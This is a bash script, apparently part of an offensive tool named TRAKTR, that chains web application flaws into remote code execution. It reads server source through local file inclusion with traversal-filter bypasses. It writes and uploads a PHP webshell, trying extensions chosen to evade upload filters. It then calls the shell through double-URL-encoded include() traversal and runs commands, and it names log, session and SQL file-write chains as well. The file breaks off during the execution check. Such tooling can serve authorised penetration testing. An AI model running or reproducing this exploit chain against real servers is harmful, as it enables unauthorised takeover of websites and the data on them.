#!/usr/bin/env bash
# TRAKTR RCE Chain Engine v2.0
# Chains multiple vulnerabilities to achieve Remote Code Execution
# Techniques: LFI+Upload, LFI+LogPoison, LFI+PHPWrapper, LFI+SessionPoison,
#             SQLi+FileWrite, Upload+DirectAccess, Double-URL-Encode Bypass
# DYNAMIC: auto-discovers traversal patterns, form actions, params, filters
# Usage: source rce_engine.sh; rce_escalate <outdir>

# ═══════════════════════════════════════════════════════════════════════════
#  MASTER RCE ESCALATION — called after LFI/SQLi/Upload findings
# ═══════════════════════════════════════════════════════════════════════════
rce_escalate() {
  local outdir="${1:-${OUTDIR:-/tmp}}"
  local target="${TARGET:-unknown}"
  local oscp="${OSCP:-false}"
  local rce_dir="${outdir}/rce"
  mkdir -p "$rce_dir"

  echo -e "\033[1;35m  ╔══════════════════════════════════════════════════════════╗\033[0m" >&2
  echo -e "\033[1;35m  ║       RCE ESCALATION ENGINE v2.0                        ║\033[0m" >&2
  echo -e "\033[1;35m  ╚══════════════════════════════════════════════════════════╝\033[0m" >&2

  local rce_achieved=false

  # ── Phase 0: Discover upload forms from HTML (before source disclosure) ──
  _rce_discover_forms_from_html "$outdir" "$rce_dir"

  # ── Phase 1: Source Code Disclosure ──
  local lfi_findings="${outdir}/vuln/lfi.json"
  if [[ -f "$lfi_findings" ]] && [[ -s "$lfi_findings" ]]; then
    _rce_source_disclosure "$outdir" "$rce_dir"
  fi

  # ── Phase 2: Chain attacks based on discovered intel ──
  # 2a: Upload + Include chain (highest priority — most reliable)
  if [[ -f "${rce_dir}/include_endpoints.txt" ]] && [[ -s "${rce_dir}/include_endpoints.txt" ]] && \
     [[ -f "${rce_dir}/upload_endpoints.txt" ]] && [[ -s "${rce_dir}/upload_endpoints.txt" ]]; then
    _rce_upload_include_chain "$outdir" "$rce_dir" && rce_achieved=true
  fi

  # 2b: PHP wrapper RCE (data://, php://input, expect://)
  if ! $rce_achieved && [[ -f "${rce_dir}/include_endpoints.txt" ]] && [[ -s "${rce_dir}/include_endpoints.txt" ]]; then
    _rce_php_wrapper_chain "$outdir" "$rce_dir" && rce_achieved=true
  fi

  # 2c: Log poisoning with include()
  if ! $rce_achieved && [[ -f "${rce_dir}/include_endpoints.txt" ]] && [[ -s "${rce_dir}/include_endpoints.txt" ]]; then
    _rce_log_poison_include "$outdir" "$rce_dir" && rce_achieved=true
  fi

  # 2d: Session file poisoning
  if ! $rce_achieved; then
    _rce_session_poison "$outdir" "$rce_dir" && rce_achieved=true
  fi

  # 2e: /proc/self/environ poisoning
  if ! $rce_achieved; then
    _rce_environ_poison "$outdir" "$rce_dir" && rce_achieved=true
  fi

  # 2f: PHP_SESSION_UPLOAD_PROGRESS race condition
  if ! $rce_achieved; then
    _rce_upload_progress "$outdir" "$rce_dir" && rce_achieved=true
  fi

  # 2g: SQLi INTO OUTFILE → webshell
  if ! $rce_achieved && [[ -f "${outdir}/vuln/sqli.json" ]] && [[ -s "${outdir}/vuln/sqli.json" ]]; then
    _rce_sqli_file_write "$outdir" "$rce_dir" && rce_achieved=true
  fi

  # ── Phase 3: Post-exploitation (if RCE achieved) ──
  if $rce_achieved; then
    _rce_post_exploit "$outdir" "$rce_dir"
  else
    echo -e "\033[1;33m  [!] RCE not achieved automatically. Manual escalation may be needed.\033[0m" >&2
    echo -e "\033[2m  [i] Check ${rce_dir}/ for discovered intel (source code, upload paths, etc.)\033[0m" >&2
  fi

  return 0
}

# ═══════════════════════════════════════════════════════════════════════════
#  PHASE 0: DISCOVER UPLOAD FORMS FROM CRAWLED HTML
#  Parses <form> tags to find upload endpoints BEFORE source disclosure
# ═══════════════════════════════════════════════════════════════════════════
_rce_discover_forms_from_html() {
  local outdir="$1" rce_dir="$2"
  echo -e "\033[1;36m  ┌─── Phase 0: HTML Form Discovery ─────────────────────\033[0m" >&2

  local target="${TARGET:-unknown}"
  local target_base="${target%%\?*}"
  : > "${rce_dir}/html_forms.txt"
  : > "${rce_dir}/html_upload_forms.txt"

  # Get list of HTML pages to check (skip static/binary/query URLs)
  local page_list="${rce_dir}/_pages_to_check.txt"
  : > "$page_list"
  if [[ -f "${outdir}/all_endpoints.txt" ]]; then
    grep -v '?' "${outdir}/all_endpoints.txt" 2>/dev/null | grep -v '\.css\|\.js\|\.png\|\.jpg\|\.gif\|\.svg\|\.ico' | sort -u | head -15 >> "$page_list"
  fi
  echo "${target_base}/" >> "$page_list"

  while IFS= read -r page_url; do
    [[ -z "$page_url" ]] && continue
    local html
    html=$(curl -sk --max-time 3 "$page_url" < /dev/null 2>/dev/null) || continue
    [[ -z "$html" ]] && continue
    echo "$html" | grep -qi '<form' || continue

    local action
    action=$(echo "$html" | grep -oiP '<form[^>]+action=["'"'"']\K[^"'"'"']+' 2>/dev/null | head -1)
    [[ -z "$action" ]] && continue

    local action_path="$action"
    [[ "$action_path" != "/"* ]] && action_path="/${action_path}"

    local has_file=false
    echo "$html" | grep -qiP 'type=["'"'"']?file' && has_file=true
    local enctype=""
    echo "$html" | grep -qiP 'enctype=["'"'"']multipart' && enctype="multipart"

    echo "${page_url}|${action_path}|${enctype}|file=${has_file}" >> "${rce_dir}/html_forms.txt"

    if $has_file || [[ -n "$enctype" ]]; then
      echo "${action_path}|${page_url}" >> "${rce_dir}/html_upload_forms.txt"
      echo -e "\033[1;33m  │ Upload form: ${page_url} → POST ${action_path}\033[0m" >&2

      # Extract field names
      local all_fields
      all_fields=$(echo "$html" | grep -oiP 'name=["'"'"']\K[^"'"'"']+' 2>/dev/null | sort -u | tr '\n' ',')
      echo -e "\033[2m  │   Fields: ${all_fields}\033[0m" >&2

      # Save individual field names (one per line)
      echo "$html" | grep -oiP 'name=["'"'"']\K[^"'"'"']+' 2>/dev/null | sort -u > "${rce_dir}/form_fields_$(echo "$action_path" | tr '/' '_').txt"

      # Detect the file input field name
      local file_field
      file_field=$(echo "$html" | grep -oiP 'type=["'"'"']?file[^>]+name=["'"'"']\K[^"'"'"']+' 2>/dev/null | head -1)
      [[ -z "$file_field" ]] && file_field=$(echo "$html" | grep -oiP 'name=["'"'"'](\w+)["'"'"'][^>]+type=["'"'"']?file' 2>/dev/null | grep -oP 'name=["'"'"']\K\w+' | head -1)
      [[ -z "$file_field" ]] && file_field="file"
      echo "$file_field" > "${rce_dir}/file_field_$(echo "$action_path" | tr '/' '_').txt"
      echo -e "\033[2m  │   File field: ${file_field}\033[0m" >&2
    fi
  done < "$page_list"
  rm -f "$page_list"

  local form_count; form_count=$(wc -l < "${rce_dir}/html_forms.txt" 2>/dev/null || echo 0)
  local upload_count; upload_count=$(wc -l < "${rce_dir}/html_upload_forms.txt" 2>/dev/null || echo 0)
  echo -e "\033[1;36m  └─── Found ${form_count} forms, ${upload_count} with file upload ────────\033[0m" >&2
}

# ═══════════════════════════════════════════════════════════════════════════
#  PHASE 1: SOURCE CODE DISCLOSURE
#  Read PHP source files via LFI to discover include(), upload, and filter logic
# ═══════════════════════════════════════════════════════════════════════════
_rce_source_disclosure() {
  local outdir="$1" rce_dir="$2"
  echo -e "\033[1;36m  ┌─── Phase 1: Source Code Disclosure ──────────────────\033[0m" >&2

  # Get working LFI payload info
  local lfi_url="" lfi_param="" lfi_bypass=""
  if [[ -f "${outdir}/vuln/lfi.json" ]]; then
    lfi_url=$(grep -oP '"url"\s*:\s*"[^"]+' "${outdir}/vuln/lfi.json" | head -1 | sed 's/"url"\s*:\s*"//')
    lfi_param=$(grep -oP '"param"\s*:\s*"[^"]+' "${outdir}/vuln/lfi.json" | head -1 | sed 's/"param"\s*:\s*"//')
    lfi_bypass=$(grep -oP '"encoding"\s*:\s*"[^"]+' "${outdir}/vuln/lfi.json" | head -1 | sed 's/"encoding"\s*:\s*"//')
  fi
  [[ -z "$lfi_url" ]] || [[ -z "$lfi_param" ]] && { echo -e "\033[2m  │ No usable LFI finding\033[0m" >&2; return 1; }

  # Determine server config from lfi_reads
  local webroot="/var/www/html"
  local server_type="nginx"
  if [[ -f "${outdir}/lfi_reads/etc_nginx_sites-enabled_default.txt" ]]; then
    local detected_root
    detected_root=$(grep -oP 'root\s+\K[^;]+' "${outdir}/lfi_reads/etc_nginx_sites-enabled_default.txt" 2>/dev/null | head -1 | tr -d ' ')
    [[ -n "$detected_root" ]] && webroot="$detected_root"
  elif [[ -f "${outdir}/lfi_reads/etc_apache2_sites-enabled_000-default.conf.txt" ]]; then
    server_type="apache"
    local detected_root
    detected_root=$(grep -oP 'DocumentRoot\s+\K\S+' "${outdir}/lfi_reads/etc_apache2_sites-enabled_000-default.conf.txt" 2>/dev/null | head -1)
    [[ -n "$detected_root" ]] && webroot="$detected_root"
  fi

  echo -e "\033[2m  │ Webroot: ${webroot} | Server: ${server_type}\033[0m" >&2
  echo "$webroot" > "${rce_dir}/webroot.txt"
  echo "$server_type" > "${rce_dir}/server_type.txt"

  # DYNAMIC: Determine bypass prefix from the working LFI payload
  local working_payload=""
  working_payload=$(grep -oP '"payload"\s*:\s*"[^"]+' "${outdir}/vuln/lfi.json" 2>/dev/null | head -1 | sed 's/"payload"\s*:\s*"//')
  local up="../"
  [[ "$working_payload" == *"..../"* ]] && up="....//";  # str_replace("../","") bypass
  [[ "$working_payload" == *"..%2f"* ]] && up="..%2f"    # URL-encoded slash bypass
  [[ "$working_payload" == *"..%252f"* ]] && up="..%252f" # double-encoded bypass
  [[ "$working_payload" == *"..%c0%af"* ]] && up="..%c0%af" # unicode bypass
  echo -e "\033[2m  │ LFI bypass pattern: '${up}'\033[0m" >&2
  echo "$up" > "${rce_dir}/lfi_bypass_prefix.txt"

  # Collect ALL pages to read — from endpoints, form actions, and common paths
  local -A seen_pages
  local unique_pages=()

  # From crawled endpoints
  if [[ -f "${outdir}/all_endpoints.txt" ]]; then
    while IFS= read -r ep_url; do
      local ep_path="${ep_url#http*://}"
      ep_path="/${ep_path#*/}"
      ep_path="${ep_path%%\?*}"
      [[ "$ep_path" == *".php" ]] || [[ "$ep_path" == *".env" ]] || continue
      [[ -n "${seen_pages[$ep_path]:-}" ]] && continue
      seen_pages[$ep_path]=1; unique_pages+=("$ep_path")
    done < <(sort -u "${outdir}/all_endpoints.txt" | head -30)
  fi

  # DYNAMIC: From discovered HTML form actions (Phase 0)
  if [[ -f "${rce_dir}/html_forms.txt" ]]; then
    while IFS='|' read -r _ action_path _; do
      [[ -z "$action_path" ]] && continue
      [[ -n "${seen_pages[$action_path]:-}" ]] && continue
      seen_pages[$action_path]=1; unique_pages+=("$action_path")
    done < "${rce_dir}/html_forms.txt"
  fi

  # Common pages (only those not already seen)
  for p in "/index.php" "/contact.php" "/apply.php" "/login.php" "/admin.php" \
           "/config.php" "/.env" "/api/index.php"; do
    [[ -n "${seen_pages[$p]:-}" ]] && continue
    seen_pages[$p]=1; unique_pages+=("$p")
  done

  : > "${rce_dir}/include_endpoints.txt"
  : > "${rce_dir}/upload_endpoints.txt"
  : > "${rce_dir}/source_files.txt"
  : > "${rce_dir}/filter_logic.txt"

  local sources_read=0
  for page_path in "${unique_pages[@]}"; do
    local source_content=""
    local resp_file="${rce_dir}/src_$(echo "$page_path" | tr '/' '_').txt"
    local rel_path="${page_path#/}"  # e.g. "contact.php" or "api/application.php"

    # Strategy 1: Single traverse from LFI base dir (most common)
    _rce_lfi_read "$lfi_url" "$lfi_param" "${up}${rel_path}" "$resp_file"
    [[ -s "$resp_file" ]] && source_content=$(cat "$resp_file" 2>/dev/null)

    # Strategy 2: Full absolute path with deep traversal
    if [[ -z "$source_content" ]] || [[ ${#source_content} -lt 10 ]]; then
      _rce_lfi_read "$lfi_url" "$lfi_param" "${up}${up}${up}${up}${up}${up}${up}${up}${webroot#/}/${rel_path}" "$resp_file"
      [[ -s "$resp_file" ]] && source_content=$(cat "$resp_file" 2>/dev/null)
    fi

    # Strategy 3: Two-level traverse
    if [[ -z "$source_content" ]] || [[ ${#source_content} -lt 10 ]]; then
      _rce_lfi_read "$lfi_url" "$lfi_param" "${up}${up}${rel_path}" "$resp_file"
      [[ -s "$resp_file" ]] && source_content=$(cat "$resp_file" 2>/dev/null)
    fi

    [[ -z "$source_content" ]] || [[ ${#source_content} -lt 10 ]] && { rm -f "$resp_file"; continue; }

    # Check if this contains PHP source (<?php, inline PHP, or PHP functions)
    if echo "$source_content" | grep -qP '<\?php|<\?=|\b(include|require|include_once|require_once)\b|file_get_contents|move_uploaded_file|\$_FILES|\$_GET|\$_POST|system\s*\(|exec\s*\(|passthru|shell_exec' 2>/dev/null; then
      ((sources_read++)) || true
      echo "${page_path}" >> "${rce_dir}/source_files.txt"
      echo -e "\033[1;32m  │ Source: ${page_path}\033[0m \033[2m(${#source_content} bytes)\033[0m" >&2

      # === ANALYZE: include/require calls ===
      if echo "$source_content" | grep -qP '\b(include|include_once|require|require_once)\b' 2>/dev/null; then
        local include_info
        include_info=$(echo "$source_content" | grep -oP '(include|include_once|require|require_once)\s*(\(|["'"'"']).{0,80}' 2>/dev/null | head -3)
        echo "${page_path}|${include_info}" >> "${rce_dir}/include_endpoints.txt"
        echo -e "\033[1;33m  │   → include() found: ${include_info}\033[0m" >&2

        # Extract filter logic
        local filter_info
        filter_info=$(echo "$source_content" | grep -oP '(str_contains|preg_match|strpos|str_replace|htmlspecialchars|strip_tags|addslashes|basename|realpath)\s*\([^)]+\)' 2>/dev/null | head -5)
        [[ -n "$filter_info" ]] && {
          echo "${page_path}|${filter_info}" >> "${rce_dir}/filter_logic.txt"
          echo -e "\033[1;33m  │   → Filter: ${filter_info}\033[0m" >&2
        }

        # Detect urldecode() → double-encode bypass opportunity
        if echo "$source_content" | grep -qP 'urldecode\s*\(' 2>/dev/null; then
          echo "${page_path}|DOUBLE_ENCODE_BYPASS" >> "${rce_dir}/filter_logic.txt"
          echo -e "\033[1;31m  │   → urldecode() = DOUBLE URL ENCODE BYPASS!\033[0m" >&2
        fi

        # DYNAMIC: Extract ALL parameter names feeding into include
        local params_for_include
        params_for_include=$(echo "$source_content" | grep -oP '\$_(GET|POST|REQUEST)\[["'"'"']\K[^"'"'"']+' 2>/dev/null | sort -u)
        [[ -n "$params_for_include" ]] && {
          echo "$params_for_include" > "${rce_dir}/include_params_$(echo "$page_path" | tr '/' '_').txt"
          echo -e "\033[2m  │   → Params: $(echo "$params_for_include" | tr '\n' ', ')\033[0m" >&2
        }

        # DYNAMIC: Detect include base directory
        local include_base_dir
        include_base_dir=$(echo "$source_content" | grep -oP '(include|require)[^;]*["'"'"']\./?\K[^"'"'"'/]+/' 2>/dev/null | head -1)
        [[ -n "$include_base_dir" ]] && {
          echo "$include_base_dir" > "${rce_dir}/include_basedir_$(echo "$page_path" | tr '/' '_').txt"
          echo -e "\033[2m  │   → Include base dir: ./${include_base_dir}\033[0m" >&2
        }
      fi

      # === ANALYZE: file_get_contents (read-only LFI, no exec) ===
      if echo "$source_content" | grep -qP 'file_get_contents\s*\(' 2>/dev/null; then
        echo "${page_path}|file_get_contents" >> "${rce_dir}/lfi_type.txt" 2>/dev/null
        echo -e "\033[2m  │   → file_get_contents() (read-only, no PHP exec)\033[0m" >&2

        # Extract the prepended path for understanding LFI base
        local fgc_path
        fgc_path=$(echo "$source_content" | grep -oP 'file_get_contents\s*\(\s*["'"'"']\K[^"'"'"']+' 2>/dev/null | head -1)
        [[ -n "$fgc_path" ]] && echo -e "\033[2m  │   → LFI base path: ${fgc_path}\033[0m" >&2

        # Also look for str_replace bypass info
        local str_replace_info
        str_replace_info=$(echo "$source_content" | grep -oP 'str_replace\s*\([^)]+\)' 2>/dev/null | head -3)
        [[ -n "$str_replace_info" ]] && echo -e "\033[1;33m  │   → Input filter: ${str_replace_info}\033[0m" >&2
      fi

      # === ANALYZE: file upload handling ===
      if echo "$source_content" | grep -qP 'move_uploaded_file|\$_FILES\[|type.*file|enctype.*multipart' 2>/dev/null; then
        local upload_info
        upload_info=$(echo "$source_content" | grep -oP '(move_uploaded_file|copy)\s*\([^)]+\)' 2>/dev/null | head -3)
        local upload_path
        upload_path=$(echo "$source_content" | grep -oP '(move_uploaded_file|copy)\s*\([^,]+,\s*\K[^)]+' 2>/dev/null | head -1)
        local ext_check
        ext_check=$(echo "$source_content" | grep -oiP '(explode|pathinfo|substr|preg_match|in_array).*?(ext|extension|\.php|\.jpg|\.png|\.pdf|allowed|whitelist|blacklist)' 2>/dev/null | head -3)
        echo "${page_path}|${upload_path}|${ext_check}" >> "${rce_dir}/upload_endpoints.txt"
        echo -e "\033[1;31m  │   → FILE UPLOAD: target=${upload_path}\033[0m" >&2
        [[ -n "$ext_check" ]] && echo -e "\033[1;33m  │   → Extension check: ${ext_check}\033[0m" >&2 || \
          echo -e "\033[1;31m  │   → NO EXTENSION VALIDATION!\033[0m" >&2

        # Naming convention
        local naming
        naming=$(echo "$source_content" | grep -oP '(md5_file|md5|uniqid|time|rand|sha1|basename)\s*\(' 2>/dev/null | head -3)
        [[ -n "$naming" ]] && echo -e "\033[2m  │   → Naming: ${naming}\033[0m" >&2

        # Extract file field name from PHP source
        local php_file_field
        php_file_field=$(echo "$source_content" | grep -oP '\$_FILES\[["'"'"']\K[^"'"'"']+' 2>/dev/null | head -1)
        [[ -n "$php_file_field" ]] && echo "$php_file_field" > "${rce_dir}/file_field_$(echo "$page_path" | tr '/' '_').txt"
      fi

      # === ANALYZE: direct command execution ===
      if echo "$source_content" | grep -qP 'system\s*\(|exec\s*\(|passthru\s*\(|shell_exec\s*\(|popen\s*\(|proc_open\s*\(' 2>/dev/null; then
        local exec_info
        exec_info=$(echo "$source_content" | grep -oP '(system|exec|passthru|shell_exec|popen|proc_open)\s*\([^)]*\)' 2>/dev/null | head -3)
        echo -e "\033[1;31m  │   → COMMAND EXECUTION: ${exec_info}\033[0m" >&2
      fi
    else
      # Even non-PHP files: check if they contain useful HTML with forms
      if echo "$source_content" | grep -qiP '<form.*action|type\s*=\s*["'"'"']?file' 2>/dev/null; then
        local html_action
        html_action=$(echo "$source_content" | grep -oiP '<form[^>]+action\s*=\s*["'"'"']\K[^"'"'"']+' 2>/dev/null | head -1)
        if [[ -n "$html_action" ]]; then
          # Normalize path
          [[ "$html_action" != "/"* ]] && html_action="/${html_action}"
          [[ ! -f "${seen_pages[$html_action]+_}" ]] && {
            echo -e "\033[1;33m  │   → Form action found in HTML: ${html_action}\033[0m" >&2
            # Add this as a page to read (for upload handler)
            if ! grep -q "^${html_action}|" "${rce_dir}/upload_endpoints.txt" 2>/dev/null; then
              # Mark as HTML-discovered upload
              if echo "$source_content" | grep -qiP 'type\s*=\s*["'"'"']?file' 2>/dev/null; then
                echo "${html_action}|html_discovered|" >> "${rce_dir}/upload_endpoints.txt"
                echo -e "\033[1;31m  │   → HTML-discovered upload handler: ${html_action}\033[0m" >&2
              fi
            fi
          }
        fi
      fi
      rm -f "$resp_file"
    fi
  done

  # DYNAMIC: If HTML upload forms were found in Phase 0, add their action targets
  if [[ -f "${rce_dir}/html_upload_forms.txt" ]] && [[ -s "${rce_dir}/html_upload_forms.txt" ]]; then
    while IFS='|' read -r action_path _; do
      if ! grep -q "^${action_path}|" "${rce_dir}/upload_endpoints.txt" 2>/dev/null; then
        echo "${action_path}|html_form_action|" >> "${rce_dir}/upload_endpoints.txt"
        echo -e "\033[1;33m  │ Added HTML upload target: ${action_path}\033[0m" >&2
      fi
    done < "${rce_dir}/html_upload_forms.txt"
  fi

  echo -e "\033[1;36m  └─── ${sources_read} source files read ────────────────────\033[0m" >&2
  return 0
}

# ═══════════════════════════════════════════════════════════════════════════
#  CHAIN 1: UPLOAD + INCLUDE (FULLY DYNAMIC)
# ═══════════════════════════════════════════════════════════════════════════
_rce_upload_include_chain() {
  local outdir="$1" rce_dir="$2"
  echo -e "\033[1;36m  ┌─── Chain: Upload + Include ─────────────────────────\033[0m" >&2

  local target="${TARGET:-unknown}"
  local target_base="${target%%\?*}"
  local webroot
  webroot=$(cat "${rce_dir}/webroot.txt" 2>/dev/null) || webroot="/var/www/html"
  local up
  up=$(cat "${rce_dir}/lfi_bypass_prefix.txt" 2>/dev/null) || up="../"

  # Read ALL upload endpoints (both PHP-source-discovered and HTML-discovered)
  local upload_page="" upload_target_path=""
  while IFS='|' read -r page upath _; do
    [[ -z "$page" ]] && continue
    upload_page="$page"
    upload_target_path="$upath"
    break  # Take the first one
  done < "${rce_dir}/upload_endpoints.txt"
  [[ -z "$upload_page" ]] && { echo -e "\033[2m  │ No upload endpoint found\033[0m" >&2; return 1; }

  # Read ALL include endpoints
  local include_page="" include_code=""
  while IFS='|' read -r page code; do
    [[ -z "$page" ]] && continue
    include_page="$page"
    include_code="$code"
    break
  done < <(head -1 "${rce_dir}/include_endpoints.txt")
  [[ -z "$include_page" ]] && { echo -e "\033[2m  │ No include endpoint found\033[0m" >&2; return 1; }

  # Check for filter bypass requirements
  local needs_double_encode=false
  grep -q "DOUBLE_ENCODE_BYPASS" "${rce_dir}/filter_logic.txt" 2>/dev/null && needs_double_encode=true

  echo -e "\033[2m  │ Upload: ${upload_page} → ${upload_target_path}\033[0m" >&2
  echo -e "\033[2m  │ Include: ${include_page}\033[0m" >&2
  [[ "$needs_double_encode" == true ]] && echo -e "\033[1;33m  │ Double URL encoding bypass required\033[0m" >&2

  # === Step 1: Create PHP webshell ===
  local shell_content='<?php system($_GET["cmd"]); ?>'
  local shell_file="${rce_dir}/traktr_shell.php"
  echo -n "$shell_content" > "$shell_file"
  local shell_md5
  shell_md5=$(md5sum "$shell_file" | cut -d' ' -f1)
  echo -e "\033[1;33m  │ Webshell md5: ${shell_md5}\033[0m" >&2

  # === Step 2: DYNAMIC — Detect upload URL and form fields ===
  local upload_url="${target_base}${upload_page}"

  # DYNAMIC: Get file field name (from PHP source or HTML)
  local file_field="file"
  local field_file="${rce_dir}/file_field_$(echo "$upload_page" | tr '/' '_').txt"
  [[ -f "$field_file" ]] && file_field=$(cat "$field_file" 2>/dev/null)

  # DYNAMIC: Get ALL form fields from HTML analysis
  local form_fields_file="${rce_dir}/form_fields_$(echo "$upload_page" | tr '/' '_').txt"
  local -a extra_fields=()

  if [[ -f "$form_fields_file" ]]; then
    while IFS= read -r fname; do
      [[ -z "$fname" ]] || [[ "$fname" == "$file_field" ]] && continue
      extra_fields+=("$fname")
    done < "$form_fields_file"
  fi

  # If no form fields file for the upload page, check the HTML source page
  if [[ ${#extra_fields[@]} -eq 0 ]] && [[ -f "${rce_dir}/html_upload_forms.txt" ]]; then
    local source_page
    source_page=$(grep "^${upload_page}|" "${rce_dir}/html_upload_forms.txt" 2>/dev/null | cut -d'|' -f2 | head -1)
    [[ -n "$source_page" ]] && {
      local sp_path="${source_page#http*://}"
      sp_path="/${sp_path#*/}"
      sp_path="${sp_path%%\?*}"
      form_fields_file="${rce_dir}/form_fields_$(echo "$sp_path" | tr '/' '_').txt"
      if [[ -f "$form_fields_file" ]]; then
        while IFS= read -r fname; do
          [[ -z "$fname" ]] || [[ "$fname" == "$file_field" ]] && continue
          extra_fields+=("$fname")
        done < "$form_fields_file"
      fi
    }
  fi

  echo -e "\033[2m  │ File field: ${file_field} | Extra fields: ${#extra_fields[@]}\033[0m" >&2

  # === Step 3: Upload with multiple extension strategies ===
  local upload_success=false
  local uploaded_filename=""
  local -a extensions=("php" "phtml" "phar" "php5" "php7" "phps" "php.jpg" "php.png")

  for ext in "${extensions[@]}"; do
    local try_filename="traktr_shell.${ext}"

    # Build curl args fresh each time (avoid fragile array index replacement)
    local -a upload_args=("-sk" "-F" "${file_field}=@${shell_file};filename=${try_filename}")
    for ef in "${extra_fields[@]}"; do
      local val="traktr"
      echo "$ef" | grep -qiE 'email' && val="scan@traktr.io"
      echo "$ef" | grep -qiE 'name|first' && val="Traktr"
      echo "$ef" | grep -qiE 'last' && val="Scanner"
      echo "$ef" | grep -qiE 'note|comment|message|text' && val="test"
      echo "$ef" | grep -qiE 'phone|tel' && val="1234567890"
      upload_args+=("-F" "${ef}=${val}")
    done
    # If no extra fields, try common defaults
    if [[ ${#extra_fields[@]} -eq 0 ]]; then
      upload_args+=("-F" "firstName=Traktr" "-F" "lastName=Scanner" "-F" "email=scan@traktr.io" "-F" "notes=test")
    fi

    local upload_resp
    upload_resp=$(curl "${upload_args[@]}" -w '\n%{http_code}' "$upload_url" < /dev/null 2>/dev/null)
    local upload_status
    upload_status=$(echo "$upload_resp" | tail -1)

    echo -e "\033[2m  │ Try ${try_filename}: HTTP ${upload_status}\033[0m" >&2

    if [[ "$upload_status" == "302" ]] || [[ "$upload_status" == "200" ]] || [[ "$upload_status" == "301" ]]; then
      uploaded_filename="${shell_md5}.${ext}"
      upload_success=true
      echo -e "\033[1;32m  │ Upload OK (HTTP ${upload_status}): ${try_filename} → ${uploaded_filename}\033[0m" >&2
      break
    fi
  done

  if ! $upload_success; then
    echo -e "\033[1;31m  │ All upload strategies failed\033[0m" >&2
    echo -e "\033[1;36m  └─── Upload+Include: FAILED ─────────────────────────\033[0m" >&2
    return 1
  fi

  # === Step 4: Determine uploaded file location ===
  local upload_dir=""
  if [[ -n "$upload_target_path" ]] && [[ "$upload_target_path" != "html"* ]]; then
    upload_dir=$(echo "$upload_target_path" | grep -oP '["\x27]([^"\x27]+/)["\x27]' | tr -d "\"'" | head -1)
    [[ -z "$upload_dir" ]] && upload_dir=$(echo "$upload_target_path" | grep -oP '\.\.\S+/' | head -1)
  fi
  [[ -z "$upload_dir" ]] && upload_dir="../uploads/"

  # Resolve upload dir to webroot-relative path
  local upload_webpath=""
  if [[ "$upload_dir" == "../"* ]]; then
    # ../uploads/ relative to handler dir → strip ../ and keep the rest
    upload_webpath="${upload_dir#../}"
  elif [[ "$upload_dir" == "/"* ]]; then
    upload_webpath="${upload_dir#/}"
  else
    upload_webpath="$upload_dir"
  fi
  echo -e "\033[2m  │ Upload resolved to: /${upload_webpath}\033[0m" >&2

  # === Step 5: DYNAMIC — Extract include parameter from source ===
  local include_param=""
  local params_file="${rce_dir}/include_params_$(echo "$include_page" | tr '/' '_').txt"
  if [[ -f "$params_file" ]]; then
    # Use the first parameter from the include page's source
    include_param=$(head -1 "$params_file")
  fi
  # Fallback: try extracting from the source file directly
  if [[ -z "$include_param" ]]; then
    local src_file="${rce_dir}/src_$(echo "$include_page" | tr '/' '_').txt"
    [[ -f "$src_file" ]] && include_param=$(grep -oP '\$_GET\[["'"'"']\K[^"'"'"']+' "$src_file" 2>/dev/null | head -1)
    [[ -z "$include_param" ]] && [[ -f "$src_file" ]] && include_param=$(grep -oP '\$_REQUEST\[["'"'"']\K[^"'"'"']+' "$src_file" 2>/dev/null | head -1)
    [[ -z "$include_param" ]] && [[ -f "$src_file" ]] && include_param=$(grep -oP '\$_POST\[["'"'"']\K[^"'"'"']+' "$src_file" 2>/dev/null | head -1)
  fi
  # Last resort: try common names from active_params
  if [[ -z "$include_param" ]]; then
    include_param=$(grep -i "${include_page##*/}" "${outdir}/active_params.txt" 2>/dev/null | head -1 | cut -d'|' -f2 | tr -d ' ')
  fi
  [[ -z "$include_param" ]] && include_param="page"  # generic fallback
  echo -e "\033[2m  │ Include param: ${include_param}\033[0m" >&2

  # === Step 6: DYNAMIC — Determine include base dir and build traversal ===
  local include_basedir=""
  local basedir_file="${rce_dir}/include_basedir_$(echo "$include_page" | tr '/' '_').txt"
  [[ -f "$basedir_file" ]] && include_basedir=$(cat "$basedir_file" 2>/dev/null)

  # Check if .php is auto-appended to the include
  local auto_php=false
  local src_file="${rce_dir}/src_$(echo "$include_page" | tr '/' '_').txt"
  if [[ -f "$src_file" ]]; then
    grep -qP '(include|require).*?\.php' "$src_file" 2>/dev/null && auto_php=true
  fi

  # Build traversal: from include_basedir to the uploads directory
  # If include does: include("./regions/" . $param . ".php")
  # We need param = ../uploads/<md5> (one level up from regions/)
  # If include does: include("./" . $param . ".php")
  # We need param = uploads/<md5>
  local include_traversal=""
  if [[ -n "$include_basedir" ]]; then
    # Count depth of the base dir to traverse up
    local depth
    depth=$(echo "$include_basedir" | tr -cd '/' | wc -c)
    local ups=""
    for ((i=0; i<depth; i++)); do ups+="../"; done
    include_traversal="${ups}${upload_webpath}${shell_md5}"
  else
    include_traversal="../${upload_webpath}${shell_md5}"
  fi

  # Append .php extension only if NOT auto-appended
  $auto_php || include_traversal="${include_traversal}.php"

  echo -e "\033[2m  │ Base dir: ${include_basedir:-none} | Auto .php: ${auto_php}\033[0m" >&2
  echo -e "\033[2m  │ Traversal: ${include_traversal}\033[0m" >&2

  # === Step 7: Try ALL encoding strategies ===
  local include_url="${target_base}${include_page}"
  local -a encoding_strategies=()

  # Strategy A: Double URL encode (for urldecode-after-filter pattern)
  if $needs_double_encode; then
    local double_enc
    double_enc=$(echo -n "$include_traversal" | sed 's/\./%252e/g; s/\//%252f/g')
    encoding_strategies+=("double|${double_enc}")
  fi
  # Strategy B: Single URL encode
  local single_enc
  single_enc=$(python3 -c "import sys,urllib.parse;print(urllib.parse.quote(sys.argv[1],safe=''))" "$include_traversal" 2>/dev/null || echo "$include_traversal")
  encoding_strategies+=("single|${single_enc}")
  # Strategy C: Raw (no encoding)
  encoding_strategies+=("raw|${include_traversal}")

  for strategy in "${encoding_strategies[@]}"; do
    local strat_name="${strategy%%|*}"
    local encoded_traversal="${strategy#*|}"
    local rce_test_url="${include_url}?${include_param}=${encoded_traversal}&cmd=id"
    echo -e "\033[1;33m  │ Trying (${strat_name}): ${rce_test_url}\033[0m" >&2

    local rce_resp_file="${rce_dir}/rce_test.txt"
    curl -sk --max-time 10 "$rce_test_url" -o "$rce_resp_file" < /dev/null 2>/dev/null

    if grep -q 'uid=' "$rce_resp_file" 2>/dev/null; then
      local uid_info
      uid_info=$(grep -oP 'uid=\d+\([^)]+\)\s*gid=\d+\([^)]+\)' "$rce_resp_file" 2>/dev/null | head -1)
